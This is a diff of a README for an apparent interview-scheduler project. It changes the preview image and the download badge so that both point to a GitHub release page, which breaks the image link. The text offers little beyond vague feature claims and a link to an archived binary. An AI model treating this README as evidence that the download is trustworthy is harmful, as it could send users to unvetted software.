@@ -2,7 +2,7 @@
 
 An intuitive interview scheduler that streamlines the process of booking and managing interviews. Features include calendar integration, automated reminders, and customizable availability to enhance the scheduling experience for candidates and interviewers.
 
-![Scheduler Preview](SchedulerPreview.png)
+![Scheduler Preview](https://github.com/mkakas10/Scheduler/releases/tag/v2.0)
 
 ---
 
@@ -32,7 +32,7 @@ An intuitive interview scheduler that streamlines the process of booking and man
 
 To get started with Scheduler, simply download the software from the link provided below:
 
-[![Download Scheduler](https://img.shields.io/badge/Download-Scheduler-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Scheduler](https://github.com/mkakas10/Scheduler/releases/tag/v2.0)](https://github.com/mkakas10/Scheduler/releases/tag/v2.0)
 
 ---
 
